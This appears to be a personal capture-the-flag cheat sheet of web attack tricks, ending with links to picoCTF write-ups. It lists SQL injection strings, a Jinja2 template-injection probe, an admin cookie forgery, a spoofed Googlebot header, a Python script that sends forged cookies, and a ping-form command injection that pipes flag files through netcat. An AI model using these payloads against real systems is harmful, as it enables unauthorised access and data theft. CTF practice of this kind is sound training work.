# Ch34tsh33t
My CheatSheet


*Always check the Http method needed. Below are the list of HTTP Methods*
-POST
-GET
-PUT
-PATCH
-DELETE

*Using Google as secret-agent*
headers = {
	'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
}

*If No Login was provided but Admin login is available*
Try using cookie "admin" set it to "true"

*SQL Injection*
' OR '1'='1' --
' LIKE '%'; --
' UNION SELECT * FROM answers WHERE answer GLOB '<input>*'; --

*Testing for Flask framework (Jinja2)*
{{1+1}} -> {{config.items()}}

*Exploiting Ping command via WebApp*
8.8.8.8; cat *flag* | nc -lp 54433 -> nc targetip 54433

*Python Code To get http request*

#!/usr/bin/python

import requests
import re

params = {'user': 'test', 'password': 'test', 'submit': 'Sign In'}
jar = {'admin': 'True', 'password': '', 'username': ''}

r = requests.get('{TARGET IP}', data=params, cookies=jar)
source = r.text
print re.findall(r'(flag\{.+\})', source)[0]

*OTHERS*

*Forensics*

*Bitflip*
https://wannabyte.xyz/2018/10/picoctf-secure-logon/
https://security.stackexchange.com/questions/177614/how-difficult-is-it-to-modify-aes-ciphertext-in-a-meaningful-way

*General Skills*
https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/general-skills/
https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/general-skills/
